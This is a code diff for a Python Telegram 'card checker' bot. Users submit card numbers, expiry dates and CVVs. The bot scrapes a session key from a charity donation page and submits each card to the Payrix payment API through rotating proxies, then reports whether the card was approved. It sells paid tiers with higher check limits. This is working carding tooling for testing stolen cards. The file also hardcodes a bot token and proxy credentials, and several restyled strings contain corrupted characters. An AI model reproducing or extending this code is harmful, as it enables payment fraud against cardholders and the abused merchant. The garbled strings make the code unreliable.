@@ -16,8 +16,9 @@ bot = telebot.TeleBot("7195510626:AAHdF4spBrcmWPPx9-1gogU1yKM1Rs5qe-s")
 OWNER_ID = 6460703454
 USER_DATA_FILE = "user_data.json"
 PROXIES = [
-"node1.veilpro.tech:6000:IoyTYu:K4NwIV",
-"node1.veilpro.tech:6000:e0TSaD:B6cEuH"]  # Add proxies in format: "ip:port:user:pass"
+    "node1.veilpro.tech:6000:IoyTYu:K4NwIV",
+    "node1.veilpro.tech:6000:e0TSaD:B6cEuH"
+]
 
 # Initialize user data
 if not os.path.exists(USER_DATA_FILE):
@@ -55,21 +56,19 @@ def process_payment(card_number, exp_month, exp_year, cvv):
         session.proxies.update(proxy)
 
     try:
-        # Handle expiration year
         exp_year = exp_year[-2:] if len(exp_year) == 4 else exp_year
         if len(exp_year) != 2:
             raise ValueError("Invalid expiration year format")
 
-        # First request to get session key
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
             'Referer': 'https://www.womensurgeons.org/'
         }
-        response = session.get("https://donate.givedirect.org?cid=15724", headers=headers)
+        response = session.get("https://donate.givedirect.org?cid=15724", headers=headers, timeout=10)
+        response.raise_for_status()
         soup = BeautifulSoup(response.text, 'html.parser')
         txnsession_key = soup.find('input', {'id': 'txnsession_key'})['value']
 
-        # Payment request
         payload = {
             'origin': '1',
             'merchant': 'p1_mer_669021f7e934f033d1bc84f',
@@ -83,24 +82,25 @@ def process_payment(card_number, exp_month, exp_year, cvv):
             'last': 'Tech'
         }
         headers['txnsessionkey'] = txnsession_key
-        response = session.post("https://api.payrix.com/txns", data=payload, headers=headers)
+        response = session.post("https://api.payrix.com/txns", data=payload, headers=headers, timeout=10)
         data = response.json()
 
-        # Handle response
         if data.get('response', {}).get('errors'):
             error_msg = data['response']['errors'][0]['msg']
             if "blocked from accessing this form" in error_msg:
-                return "RISKY! RETRY THIS BIN LATER"
+                return "𝐑𝐈𝐒𝐊𝐘! 𝐑𝐄𝐓𝐑𝐘 𝐓𝐇𝐈𝐒 𝐁𝐈𝐍 𝐋𝐀𝐓𝐄𝐑"
             return error_msg
-        return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
+        return "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
     
+    except requests.RequestException as e:
+        return f"𝐄𝐫𝐫𝐨𝐫: 𝐍𝐞𝐭𝐰𝐨𝐫𝐤 𝐢𝐬𝐬𝐮𝐞 - {str(e)}"
     except Exception as e:
-        return f"Error: {str(e)}"
+        return f"𝐄𝐫𝐫𝐨𝐫: {str(e)}"
 
 # BIN information lookup
 def get_bin_info(card_number):
     try:
-        response = requests.get(f"https://api.juspay.in/cardbins/{card_number[:6]}")
+        response = requests.get(f"https://api.juspay.in/cardbins/{card_number[:6]}", timeout=5)
         data = response.json()
         return {
             'brand': data.get('brand', 'Unknown'),
@@ -127,33 +127,32 @@ def check_limits(user_id):
     if user_id == OWNER_ID:
         return True, None
     
-    # Premium user check
     if str(user_id) in user_data['premium_users']:
         plan = PLANS[user_data['premium_users'][str(user_id)]['plan_id']]
         last_check = user_data['premium_users'][str(user_id)].get('last_check', 0)
         checks = [t for t in user_data['premium_users'][str(user_id)].get('checks', []) 
-                 if (now - datetime.fromisoformat(t)).seconds < 3600]
+                 if (now - datetime.fromisoformat(t)).total_seconds() < 3600]
         
         if len(checks) >= plan['limit']:
-            return False, "Hourly limit reached"
+            return False, "𝐇𝐨𝐮𝐫𝐥𝐲 𝐥𝐢𝐦𝐢𝐭 𝐫𝐞𝐚𝐜𝐡𝐞𝐝"
         if time.time() - last_check < plan['cooldown']:
-            return False, f"Cooldown: {plan['cooldown'] - int(time.time() - last_check)}s"
+            return False, f"𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧: {plan['cooldown'] - int(time.time() - last_check)}𝐬"
         
         user_data['premium_users'][str(user_id)]['last_check'] = time.time()
-        user_data['premium_users'][str(user_id)]['checks'].append(now.isoformat())
+        user_data['premium_users'][str(user_id)]['checks'] = checks + [now.isoformat()]
         save_user_data(user_data)
         return True, None
     
-    # Free user check
     else:
-        last_check = user_data['free_users'].get(str(user_id), {}).get('last_check', 0)
-        checks = [t for t in user_data['free_users'].get(str(user_id), {}).get('checks', [])
-                 if (now - datetime.fromisoformat(t)).seconds < 3600]
+        user_info = user_data['free_users'].get(str(user_id), {})
+        last_check = user_info.get('last_check', 0)
+        checks = [t for t in user_info.get('checks', []) 
+                 if (now - datetime.fromisoformat(t)).total_seconds() < 3600]
         
         if len(checks) >= FREE_LIMIT:
-            return False, "Free hourly limit reached"
+            return False, "𝐅𝐫𝐞𝐞 𝐡𝐨𝐮𝐫𝐥𝐲 𝐥𝐢𝐦𝐢𝐭 𝐫𝐞𝐚𝐜𝐡𝐞𝐝"
         if time.time() - last_check < FREE_COOLDOWN:
-            return False, f"Cooldown: {FREE_COOLDOWN - int(time.time() - last_check)}s"
+            return False, f"𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧: {FREE_COOLDOWN - int(time.time() - last_check)}𝐬"
         
         user_data['free_users'][str(user_id)] = {
             'last_check': time.time(),
@@ -165,7 +164,7 @@ def check_limits(user_id):
 # Loading animation
 def update_loading_bar(chat_id, message_id, start_time, done_event):
     bar_length = 20
-    stages = ["Processing payment...", "Fetching BIN info...", "Finalizing..."]
+    stages = ["𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐩𝐚𝐲𝐦𝐞𝐧𝐭...", "𝐅𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐁𝐈𝐍 𝐢𝐧𝐟�{o...", "𝐅𝐢𝐧𝐚𝐥𝐢𝐳𝐢𝐧𝐠..."]
     while not done_event.is_set():
         elapsed = time.time() - start_time
         if elapsed > 15:
@@ -177,33 +176,29 @@ def update_loading_bar(chat_id, message_id, start_time, done_event):
             bot.edit_message_text(
                 chat_id=chat_id,
                 message_id=message_id,
-                text=f"{stage}\n[{bar}] {progress}%\nElapsed: {elapsed:.1f}s"
+                text=f"{stage}\n[{bar}] {progress}%\n𝐄𝐥𝐚𝐩𝐬𝐞𝐝: {elapsed:.1f}𝐬"
             )
         except:
             pass
         time.sleep(0.5)
 
-# Handler for start command (case-insensitive, supports /, ., !)
-@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'start')
+# Command handlers
+@bot.message_handler(commands=['start', 'START', '.start', '!start'])
 def handle_start(message):
-    user_id = message.from_user.id
     response = (
-        f"👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗛𝗥𝗞'𝘀 𝗕𝗼𝘁, {message.from_user.first_name}!\n\n"
-        f"⚡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
-        f"📌 /𝗵𝗿𝗸 𝗰𝗮𝗿𝗱|𝗠𝗠|𝗬𝗬𝗬𝗬|𝗖𝗩𝗩 - 𝗖𝗵𝗲𝗰𝗸 𝗰𝗮𝗿𝗱\n"
-        f"📌 /𝗶𝗻𝗳𝗼 - 𝗣𝗹𝗮𝗻 𝗶𝗻𝗳𝗼\n"
-        f"🚀 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗣𝗹𝗮𝗻𝘀:\n"
-        f"🔹 𝗕𝗮𝘀𝗶𝗰: 𝟭𝟱𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟱𝟬/𝗵𝗿\n"
-        f"🔹 𝗠𝗶𝗱-𝗧𝗶𝗲𝗿: 𝟭𝟯𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟭𝟬𝟬/𝗵𝗿\n"
-        f"🔹 𝗧𝗼𝗽-𝗧𝗶𝗲𝗿: 𝟳𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟭𝟱𝟬/𝗵𝗿\n"
-        f"🔄 𝗙𝗿𝗲𝗲: 𝟯𝟬𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟭𝟬/𝗵𝗿"
-    )
-    
+        f"👋 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐇𝐑𝐊'𝐬 𝐁𝐨𝐭, {message.from_user.first_name}!\n\n"
+        f"⚡ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:\n"
+        f"📌 /𝐡𝐫𝐤 𝐜𝐚𝐫𝐝|𝐌𝐌|𝐘𝐘𝐘𝐘|𝐂𝐕𝐕 - 𝐂𝐡𝐞𝐜𝐤 𝐜𝐚𝐫𝐝\n"
+        f"📌 /𝐢𝐧𝐟𝐨 - 𝐏𝐥𝐚𝐧 𝐢𝐧𝐟𝐨\n"
+        f"🚀 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐏𝐥𝐚𝐧�{s:\n"
+        f"🔹 𝐁𝐚𝐬𝐢𝐜: 𝟏𝟓𝐬 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧, 𝟓𝟎/𝐡𝐫\n"
+        f"🔹 𝐌𝐢𝐝-𝐓𝐢𝐞𝐫: 𝟏𝟑𝐬 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧, 𝟏𝟎𝟎/𝐡𝐫\n"
+        f"🔹 𝐏𝐫𝐞𝐦𝐢𝐮𝐦: 𝟕𝐬 𝐜�{o𝐥𝐝𝐨𝐰𝐧, 𝟏𝟓𝟎/𝐡𝐫\n"
+        f"🔄 𝐅𝐫𝐞𝐞: 𝟑𝟎𝐬 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧, 𝟏𝟎/𝐡𝐫"
+   )
     bot.reply_to(message, response)
 
-
-# Handler for info command (case-insensitive, supports /, ., !)
-@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'info')
+@bot.message_handler(commands=['info', 'INFO', '.info', '!info'])
 def handle_info(message):
     user_id = str(message.from_user.id)
     user_data = load_user_data()
@@ -211,143 +206,110 @@ def handle_info(message):
 
     if int(user_id) == OWNER_ID:
         response = (
-            f"👤 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼 {user_id}\n"
-            f"📛 𝗣𝗹𝗮𝗻: 𝗢𝘄𝗻𝗲𝗿 (𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀 🚀)\n"
-            f"⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 𝗡𝗼𝗻𝗲\n"
-            f"🚀 𝗛𝗼𝘂𝗿𝗹𝘆 𝗟𝗶𝗺𝗶𝘁: 𝗜𝗻𝗳𝗶𝗻𝗶𝘁𝗲\n"
-            f"✅ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗖𝗵𝗲𝗰𝗸𝘀: 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱\n"
-            f"🔄 𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝘀𝗲𝘁𝘀 𝗜𝗻: 𝗡𝗼𝘁 𝗔𝗽𝗽𝗹𝗶𝗰𝗮𝗯𝗹𝗲"
+            f"👤 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨: {user_id}\n"
+            f"📛 𝐏𝐥𝐚𝐧: 𝐎𝐰𝐧𝐞𝐫 (𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 𝐀𝐜𝐜𝐞𝐬𝐬 🚀)\n"
+            f"⏳ 𝐂�{o𝐥𝐝𝐨𝐰𝐧: 𝐍𝐨𝐧𝐞\n"
+            f"🚀 𝐇𝐨𝐮𝐫𝐥𝐲 𝐋𝐢𝐦𝐢𝐭: 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐞\n"
+            f"✅ 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐂𝐡𝐞𝐜𝐤𝐬: 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝\n"
+            f"🔄 𝐋𝐢𝐦𝐢𝐭 𝐑𝐞𝐬𝐞𝐭𝐬 𝐈𝐧: 𝐍/𝐀"
         )
-    
     elif user_id in user_data["premium_users"]:
         user_info = user_data["premium_users"][user_id]
-        plan_id = user_info["plan_id"]
-        plan = PLANS[plan_id]
-        cooldown = plan["cooldown"]
-        hourly_limit = plan["hourly_limit"]
+        plan = PLANS[user_info["plan_id"]]
         checks = user_info.get("checks", [])
+        valid_checks = [t for t in checks if (now - datetime.fromisoformat(t)).total_seconds() < 3600]
+        remaining = max(plan["limit"] - len(valid_checks), 0)
+        reset_time = str((datetime.fromisoformat(valid_checks[0]) + timedelta(hours=1) - now).seconds // 60) + " 𝐦𝐢𝐧" if valid_checks else "𝐍𝐨𝐰"
         
-        valid_checks = [t for t in checks if now - datetime.fromisoformat(t) < timedelta(hours=1)]
-        remaining_checks = max(hourly_limit - len(valid_checks), 0)
-        
-        if valid_checks:
-            next_reset_time = datetime.fromisoformat(valid_checks[0]) + timedelta(hours=1)
-            time_until_reset = str(next_reset_time - now).split('.')[0]
-        else:
-            time_until_reset = "𝗥𝗲𝘀𝗲𝘁𝘀 𝗼𝗻 𝗻𝗲𝘅𝘁 𝗿𝗲𝗾𝘂𝗲𝘀𝘁"
-
         response = (
-            f"👤 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼 {user_id}\n"
-            f"📛 𝗣𝗹𝗮𝗻: {plan['name']}\n"
-            f"⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: {cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
-            f"🚀 𝗛𝗼𝘂𝗿𝗹𝘆 𝗟𝗶𝗺𝗶𝘁: {hourly_limit}\n"
-            f"✅ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗖𝗵𝗲𝗰𝗸𝘀: {remaining_checks}\n"
-            f"🔄 𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝘀𝗲𝘁𝘀 𝗜𝗻: {time_until_reset}"
+            f"👤 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨: {user_id}\n"
+            f"📛 𝐏𝐥𝐚𝐧: {plan['name']}\n"
+            f"⏳ 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧: {plan['cooldown']}𝐬\n"
+            f"🚀 𝐇𝐨𝐮𝐫𝐥𝐲 𝐋𝐢𝐦𝐢𝐭: {plan['limit']}\n"
+            f"✅ 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐂𝐡�{e𝐜𝐤𝐬: {remaining}\n"
+            f"🔄 𝐋𝐢𝐦𝐢𝐭 𝐑𝐞𝐬𝐞𝐭𝐬 𝐈𝐧: {reset_time}"
         )
-    
     else:
         user_info = user_data["free_users"].get(user_id, {})
-        last_check = user_info.get("last_check", 0)
         checks = user_info.get("checks", [])
+        valid_checks = [t for t in checks if (now - datetime.fromisoformat(t)).total_seconds() < 3600]
+        remaining = max(FREE_LIMIT - len(valid_checks), 0)
+        reset_time = str((datetime.fromisoformat(valid_checks[0]) + timedelta(hours=1) - now).seconds // 60) + " 𝐦𝐢�{n" if valid_checks else "𝐍𝐨𝐰"
         
-        valid_checks = [t for t in checks if now - datetime.fromisoformat(t) < timedelta(hours=1)]
-        remaining_checks = max(FREE_HOURLY_LIMIT - len(valid_checks), 0)
-        
-        if valid_checks:
-            next_reset_time = datetime.fromisoformat(valid_checks[0]) + timedelta(hours=1)
-            time_until_reset = str(next_reset_time - now).split('.')[0]
-        else:
-            time_until_reset = "𝗥𝗲𝘀𝗲𝘁𝘀 𝗼𝗻 𝗻𝗲𝘅𝘁 𝗿𝗲𝗾𝘂𝗲𝘀𝘁"
-
         response = (
-            f"👤 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼 {user_id}\n"
-            f"📛 𝗣𝗹𝗮𝗻: 𝗙𝗿𝗲𝗲 𝗨𝘀𝗲𝗿\n"
-            f"⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: {FREE_COOLDOWN} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
-            f"🚀 𝗛𝗼𝘂𝗿𝗹𝘆 𝗟𝗶𝗺𝗶𝘁: {FREE_HOURLY_LIMIT}\n"
-            f"✅ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗖𝗵𝗲𝗰𝗸𝘀: {remaining_checks}\n"
-            f"🔄 𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝘀𝗲𝘁𝘀 𝗜𝗻: {time_until_reset}"
+            f"👤 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨: {user_id}\n"
+            f"📛 𝐏𝐥𝐚𝐧: 𝐅𝐫𝐞𝐞 𝐔𝐬𝐞𝐫\n"
+            f"⏳ 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧: {FREE_COOLDOWN}𝐬\n"
+            f"🚀 𝐇𝐨𝐮𝐫𝐥𝐲 𝐋𝐢𝐦𝐢𝐭: {FREE_LIMIT}\n"
+            f"✅ 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐂𝐡𝐞𝐜𝐤𝐬: {remaining}\n"
+            f"🔄 𝐋𝐢𝐦𝐢𝐭 𝐑𝐞𝐬𝐞𝐭𝐬 𝐈𝐧: {reset_time}"
         )
-    
     bot.reply_to(message, response)
 
-
-# Handler for plan command (case-insensitive, supports /, ., !)
-@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'plan')
+@bot.message_handler(commands=['plan', 'PLAN', '.plan', '!plan'])
 def handle_plan(message):
     if message.from_user.id != OWNER_ID:
-        bot.reply_to(message, "𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.")
+        bot.reply_to(message, "🚫 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.")
         return
     
     try:
         _, user_id, plan_id = message.text.split()
-        user_id = int(user_id)
+        user_id = str(int(user_id))
         if plan_id not in PLANS:
-            bot.reply_to(message, f"𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗹𝗮𝗻 𝗜𝗗. 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗽𝗹𝗮𝗻𝘀: {', '.join(PLANS.keys())}")
+            bot.reply_to(message, f"❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐩𝐥𝐚𝐧 𝐈𝐃. 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞: {', '.join(PLANS.keys())}")
             return
         
         user_data = load_user_data()
-        user_data["premium_users"][str(user_id)] = {
-            "plan_id": plan_id,
-            "last_check": 0,
-            "checks": []
-        }
+        user_data["premium_users"][user_id] = {"plan_id": plan_id, "last_check": 0, "checks": []}
         save_user_data(user_data)
-        bot.reply_to(message, f"𝗨𝘀𝗲𝗿 {user_id} 𝗮𝘀𝘀𝗶𝗴𝗻𝗲𝗱 𝘁𝗼 {PLANS[plan_id]['name']} (𝗣𝗹𝗮𝗻 {plan_id}).")
+        bot.reply_to(message, f"✅ 𝐔𝐬𝐞𝐫 {user_id} 𝐚𝐬𝐬𝐢𝐠𝐧𝐞𝐝 𝐭𝐨 {PLANS[plan_id]['name']} (𝐏𝐥𝐚𝐧 {plan_id})")
     except ValueError:
-        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗽𝗹𝗮𝗻 𝘂𝘀𝗲𝗿_𝗶𝗱 𝗽𝗹𝗮𝗻_𝗶𝗱")
+        bot.reply_to(message, "ℹ️ 𝐔𝐬𝐚𝐠𝐞: /𝐩𝐥𝐚𝐧 𝐮𝐬𝐞𝐫_𝐢𝐝 𝐩𝐥𝐚𝐧_𝐢𝐝")
 
-@bot.message_handler(func=lambda m: True)
+@bot.message_handler(func=lambda m: re.match(r'^[!./]?hrk\b', m.text.lower()))
 def handle_hrk(message):
     try:
-        # Extract card details
         match = re.search(r'(\d{16})\|(\d{1,2})\|(\d{2,4})\|(\d{3})', message.text)
         if not match:
-            return bot.reply_to(message, "❌ Invalid format! Use: /hrk 4929498471949004|04|29|468")
+            return bot.reply_to(message, "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐟𝐨𝐫𝐦𝐚𝐭! 𝐔𝐬𝐞: /𝐡𝐫𝐤 𝟒𝟗𝟐𝟗𝟒𝟗𝟖𝟒𝟕𝟏𝟗𝟒𝟗𝟎𝟎𝟒|𝟎𝟒|𝟐𝟗|𝟒𝟔𝟖")
         
         card, month, year, cvv = match.groups()
         month = month.zfill(2)
         year = year[-2:] if len(year) == 4 else year
 
-        # Check limits
         allowed, reason = check_limits(message.from_user.id)
         if not allowed:
             return bot.reply_to(message, f"⏳ {reason}")
 
-        # Start processing
         start_time = time.time()
         done_event = threading.Event()
-        msg = bot.reply_to(message, "⏳ Processing...")
+        msg = bot.reply_to(message, "⏳ 𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠...")
         
-        # Start loading thread
         threading.Thread(
             target=update_loading_bar,
             args=(message.chat.id, msg.message_id, start_time, done_event)
         ).start()
 
-        # Process payment
         result = process_payment(card, month, year, cvv)
         bin_info = get_bin_info(card)
-        elapsed = f"{time.time()-start_time:.2f}s"
+        elapsed = f"{time.time()-start_time:.2f}𝐬"
 
-        # Build response
-        response = f"""
-{"✅ Approved" if "Approved" in result else "❌ Declined"}
-
-CC: {card}|{month}|{year}|{cvv}
-Gateway: HRK Special Auth
-Response: {result}
-
-BIN: {bin_info['brand']} - {bin_info['type']}
-Bank: {bin_info['bank']}
-Country: {bin_info['country']}
-
-Time: {elapsed}"""
+        response = (
+            f"{'✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝' if 'Approved' in result else '❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞�{d'}\n\n"
+            f"𝐂𝐂: {card}|{month}|{year}|{cvv}\n"
+            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 𝐇𝐑𝐊 𝐒𝐩𝐞𝐜𝐢𝐚𝐥 𝐀𝐮𝐭𝐡\n"
+            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {result}\n\n"
+            f"𝐁𝐈𝐍: {bin_info['brand']} - {bin_info['type']}\n"
+            f"𝐁𝐚𝐧𝐤: {bin_info['bank']}\n"
+            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info['country']}\n\n"
+            f"𝐓𝐢𝐦�{e: {elapsed}"
+        )
         
         done_event.set()
         bot.edit_message_text(response, message.chat.id, msg.message_id)
 
     except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)}")
+        bot.reply_to(message, f"❌ 𝐄𝐫𝐫𝐨𝐫: {str(e)}")
 
 # Start bot
 print("🟢 Bot is running...")
